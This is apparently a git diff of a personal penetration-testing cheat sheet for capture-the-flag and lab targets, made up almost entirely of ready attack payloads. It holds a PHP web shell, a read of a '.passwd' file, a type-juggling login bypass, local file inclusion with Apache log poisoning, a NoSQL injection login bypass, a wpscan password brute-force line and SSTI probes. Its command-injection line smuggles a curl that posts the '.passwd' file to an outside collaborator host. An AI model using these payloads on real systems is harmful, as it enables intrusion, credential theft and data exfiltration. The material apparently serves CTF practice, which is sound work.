@@ -43,11 +43,21 @@ wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
 ]>
 ```
 ---
-# php rce
+# php 
+## rce
 ```
 <?php echo "$ ";system($_GET['cmd']); ?>
+<?php echo "$ ";system(ls); ?>
 ```
-# php local file inclusion
+## get file content
+```
+var_dump(file_get_contents('.passwd'))
+```
+## php type juggling loose comparison
+```
+auth={"data":{"login":0,"password":[]}}
+```
+## php local file inclusion
 ```
 http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
 
@@ -58,7 +68,7 @@ curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
 ```
 ---
-# php extensions to run revsell
+## php extensions to run revsell
 ```
 .php
 .php3
@@ -67,6 +77,14 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 .phtml
 ```
 ---
+# NoSQL injection - Authentication
+```
+http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=[^admin|^test]&pass[$ne]=admin
+```
+# Command injection - Filter bypass
+```
+ip=127.0.0.1%0Acurl -X POST -d @.passwd http://o4txoihjdkeyuqp2r6udoi7sejka81wq.oastify.com
+```
 # Cadaver for WebDAV
 ---
 # payload in base64 format
@@ -207,6 +225,9 @@ ${7*7}
 <%= 7*7%>
 ${{7*7}}
 #{7*7}
+
+java:
+
 ```
 # steal cookie
 ```
